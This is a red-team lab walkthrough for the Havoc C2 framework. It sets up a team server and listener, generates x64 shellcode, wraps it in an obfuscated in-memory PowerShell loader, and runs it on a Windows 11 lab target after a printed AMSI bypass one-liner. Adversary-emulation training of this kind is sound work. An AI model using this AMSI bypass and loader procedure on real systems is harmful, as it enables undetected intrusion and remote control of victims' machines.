# 2 - Initial Compromise and Weaponization

## C2 Communication 
Command and Control (C2) is the backbone of any offensive security operation, enabling persistent communication between an operator and compromised hosts. 
Once initial access is established, a C2 framework allows for payload delivery, lateral movement, privilege escalation, and stealthy persistence.

## Havoc C2 Framework

Havoc's customizable implants can be deployed to establish secure, encrypted communication channels, leveraging in-memory execution and BOF (Beacon Object File) extensions for modular and evasive payload delivery.

- Open-source, modular C2 for adversary emulation
- Customizable implants with BOF (Beacon Object File) support
- EDR evasion techniques built-in for stealthy operations
- Integrates with tools like Cobalt Strike, Mythic, and Sliver

> Please see the Havoc [Wiki](https://github.com/HavocFramework/Havoc/wiki) for complete documentation.

## Starting Havoc Team Server

To launch the Havoc Team Server, follow these steps:

1. Navigate to the Havoc directory:
```bash
cd /home/kali/Havoc
```
2. Start the Team Server:
```bash
./havoc server 10.10.X.200 --profile ./profiles/havoc.yaotl -v
```
![image](https://github.com/user-attachments/assets/61539124-3a77-40f3-9532-2a01ce92b2c4)

## Starting Havoc Client
To launch the Havoc client, follow these steps:

1. Open a new terminal and navigate to the Havoc directory:
```bash
cd /home/kali/Havoc
```
2. Start the client:
```bash
./havoc client
```
![image](https://github.com/user-attachments/assets/c46c8100-b101-4c3b-b19e-faf5746f3feb)

After launching the client, enter the following connection details:

- Alias: `[anything you like]`
- Host: `10.10.X.200`
- Port: `40056`
- User: `Neo`
- Password: `password1234`

## Listener Management

Once the Team Server is running, the next step is to configure a Listener
(the component that handles inbound and outbound Beacon communications)

A listener acts as the endpoint for compromised systems (Beacons), allowing them to communicate with the Havoc Team Server over standard HTTP/HTTPS channels using GET and POST requests. This setup enables secure, flexible C2 message exchange.

### Creating a Listener
1. Navigate to: View > Listeners
2. Click the ADD button at the bottom of the Listeners window.
![image](https://github.com/user-attachments/assets/b8be2d9e-eb5f-4ee5-8cbc-756619b76cf8)

3. Fill in the required fields:
<img width="400" height="700" alt="image" src="https://github.com/user-attachments/assets/f5a1511f-fc17-46d2-bb79-265d7e2f5bb2" /> 

- Name: `any name you like`
- Payload: `http` or `https`
- Hosts: `10.10.1.200`, just click ADD and it will autopopulate

4. Click `Save` to activate the listener.

## Generating Payloads 
Once your listener is active, you can generate payloads that will connect back to it.  
These payloads can be used for different delivery methods depending on your engagement needs.  

We are going to create a raw Windows shellcode binary (beacon.bin) that initiates a connection to our configured listener:

### Creating a Beacon (beacon.bin)
1. Navigate to: Attacks > Payloads
![image](https://github.com/user-attachments/assets/b195ce9a-1931-4c98-9003-ec232bdcf281)

2. In the payload generation window:
- Listener: `https`
- Arch: `x64`
- Format: `Windows Shellcode`
- Sleep Jmp Gadget: `jmp rbx`
- Amsi/Etw Patch: `Hardware breakpoints`

3. Click Generate

4. Save the generated Windows Shellcode payload in the following folder:
```
/home/kali/Havoc/obfuscator/beacon.bin
``` 
<img width="1548" height="822" alt="image" src="https://github.com/user-attachments/assets/ca9f3e5a-f1bb-4963-b483-7a091c325e49" />

You can replace the old `beacon.bin` file on the folder.

The output file (beacon.bin) contains the raw shellcode ready for embedding into custom loaders, BOFs, or shellcode injection frameworks.

## Converting beacon.bin to a PowerShell Loader with a Python Obfuscator Script
We will deliver the raw (beacon.bin) shellcode in a flexible and memory-resident way, 

Using the Python Obfuscator Script `havoc_obfuscate_ps1.py`, we will wrap our binary payload in a PowerShell script that can:
- Decrypts the shellcode in-memory
- Allocates executable memory
- Executes via API calls (`VirtualAlloc`, `CreateThread`)

This enables fileless execution and evades simple static detection mechanisms.

### Steps to Generate the Powershell Loader
1. Open a new terminal TAB and access the following directory:
```
cd Havoc/obfuscator/
```
2. Ensure your new payload `beacon.bin` file is generated and located in the same working directory:

3. Run the Python script to encrypt and embed the shellcode into a PowerShell loader:  

![image](https://github.com/user-attachments/assets/0f1140c0-b849-4535-b30c-6de856fbc4d7)

```bash
python3 havoc_obfuscate_ps1.py beacon.bin
```
4. The script outputs `beacon_loader_obfuscated.ps1`, which is now ready for use in initial access.

![image](https://github.com/user-attachments/assets/ffa81919-ced3-4833-a1e7-94e20236ced2)

   
## Initial Compromise — Manual Execution via PowerShell ISE

Now, we will manually execute our `beacon_loader_obfuscated.ps1` loader on the target system while bypassing Windows Defender mechanisms like AMSI (Antimalware Scan Interface).

This gives us more control over execution and helps ensure in-memory delivery of the Windows Shellcode `beacon.bin`.

### Step-by-Step
1. Navigate back to the RDP Session (FreeRDP) with the Windows 11 Host.
2. Open PowerShell_ISE.
3. On the Kali Machine, locate and open the file AMSI.txt:
```
/home/kali/Havoc/obfuscator/AMSI.txt
```
3. Do the same for our generated `beacon_loader_obfuscated.ps1` Powershell loader:

4. Inject AMSI Bypass:
```powershell
$a=([ref].Assembly.GetTypes() | ? { $_.Name -like '*Amsi*' }).DeclaredFields | ?  { $_.Name -eq 'amsiInitFailed' }
$a.SetValue([void]0, $true)
```
Paste the AMSI bypass code into the PowerShell_ISE command pane and press ENTER to execute it.

5. Copy, paste and execute the loader:
![image](https://github.com/user-attachments/assets/bbb273e7-155a-4e37-b97e-1d7abb5e5fe2)

Once AMSI is bypassed, paste the full contents of `beacon_loader_obfuscated.ps1` into the PowerShell_ISE command pane and hit Enter.

This will:
- Decrypt the shellcode
- Allocate RWX memory
- Launch a new thread with the beacon

## The Havoc beacon is deployed!
After successfully executing the payload on the target machine:
1. Return to your Kali (operator) machine.
2. Re-open the Havoc Client GUI:
3. You should now see a new active Beacon listed in the upper-left corner.

If it appears healthy, the communication with the target is established.

### Interacting with the Beacon
1. Double-click on the Beacon to open a new tab labelled with its UID.
2. In the command input at the bottom of the tab, type:
```
help
```
This will list all available post-exploitation commands and modules.
![image](https://github.com/user-attachments/assets/8904aac7-6829-4829-8351-19c87ba3a693)

